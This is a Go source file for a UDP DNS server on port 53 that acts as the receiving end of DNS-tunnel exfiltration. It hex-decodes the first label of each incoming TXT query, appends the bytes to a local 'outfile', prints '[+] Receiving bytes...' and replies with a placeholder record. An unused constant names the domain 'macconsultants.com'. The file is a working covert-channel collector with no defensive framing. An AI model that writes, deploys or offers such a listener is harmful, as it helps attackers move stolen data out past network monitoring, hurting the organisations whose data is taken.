package main

import (
	//"net"
	"strconv"
	"log"
	"strings"
	"github.com/miekg/dns"
	"encoding/hex"
	"fmt"
	"os"
)

type handler struct{}
func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {

	const dom = "macconsultants.com"


	msg := dns.Msg{}
	msg.SetReply(r)

	switch r.Question[0].Qtype {
	case dns.TypeTXT:
		msg.Authoritative = true
		domain := msg.Question[0].Name

		var requestToData map[string]string = map[string]string{
			domain: "placeholder_response",
		}

		_, ok := requestToData[domain]

		 if ok {
			fmt.Println("[+] Receiving bytes...")



			fmt.Println(domain + "\n")



		//
			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
				Txt: []string{"placeholder_response"},
			})

			split := strings.Split(domain, ".")
			split2 := split[0]
			decoded2, myerr := hex.DecodeString(split2)
			if myerr != nil {
				fmt.Println(myerr)
			}

			p, perr := os.OpenFile("outfile",
			os.O_WRONLY|os.O_APPEND|os.O_CREATE,
			0666)
			if perr != nil {
				fmt.Println("[-] Error creating the outfile...")
			}
			defer p.Close()

			p.Write(decoded2)

		}
	}


	w.WriteMsg(&msg)
}

func main() {
	srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}

}
